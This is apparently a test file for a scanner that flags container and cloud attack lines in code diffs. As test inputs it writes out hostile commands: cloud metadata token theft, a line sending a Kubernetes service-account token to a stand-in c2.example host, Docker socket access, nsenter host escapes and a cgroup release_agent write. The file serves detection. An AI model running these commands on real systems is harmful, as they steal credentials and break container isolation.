import { describe, expect, it } from 'vitest';
import { CONTAINER_CLOUD_RULES } from './container.cloud.rules';
import { addedOnlyDiff, makeChange, ruleById } from './test-support';

describe('container and cloud rules', () => {
  it.each([
    ['CAUR-CLOUD-METADATA', 'curl -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/token'],
    ['CAUR-CLOUD-METADATA', 'wget -qO- http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/'],
    [
      'CAUR-K8S-TOKEN',
      'cat /var/run/secrets/kubernetes.io/serviceaccount/token | curl --data-binary @- https://c2.example',
    ],
    ['CAUR-CONTAINER-SOCKET', 'curl --unix-socket /var/run/docker.sock http://localhost/containers/json'],
    ['CAUR-HOST-NSENTER', 'nsenter -t 1 -m -u -i -n sh -c "whoami"'],
    ['CAUR-HOST-NSENTER', 'nsenter --mount=/proc/1/ns/mnt sh'],
    ['CAUR-CGROUP-RELEASE', 'echo "$cmd" > /sys/fs/cgroup/release_agent'],
  ])('flags %s for %j', (id, line) => {
    expect(ruleById(CONTAINER_CLOUD_RULES, id).check(makeChange(addedOnlyDiff([line])))).not.toBeNull();
  });

  it('reports the container runtime socket only as a warning', () => {
    const change = makeChange(addedOnlyDiff(['docker --host unix:///run/podman/podman.sock ps']));
    expect(ruleById(CONTAINER_CLOUD_RULES, 'CAUR-CONTAINER-SOCKET').check(change)).not.toBeNull();
    expect(ruleById(CONTAINER_CLOUD_RULES, 'CAUR-CONTAINER-SOCKET').severity).toBe('warning');
  });

  it.each([
    ['CAUR-CLOUD-METADATA', 'curl https://api.example.org/metadata'],
    ['CAUR-K8S-TOKEN', 'kubectl --kubeconfig=/etc/kubernetes/admin.conf get pods'],
    ['CAUR-CONTAINER-SOCKET', 'docker build -t app .'],
    ['CAUR-HOST-NSENTER', 'nsenter -t "$(pgrep nginx)" -n ss -tulpn'],
  ])('does not flag %s for %j', (id, line) => {
    expect(ruleById(CONTAINER_CLOUD_RULES, id).check(makeChange(addedOnlyDiff([line])))).toBeNull();
  });

  it('ignores metadata endpoints inside documentation files', () => {
    const change = makeChange(addedOnlyDiff(['The metadata service lives at 169.254.169.254.']), {
      new_path: 'cloud-init/README.md',
    });
    expect(CONTAINER_CLOUD_RULES.flatMap((rule) => rule.check(change) ?? [])).toHaveLength(0);
  });
});
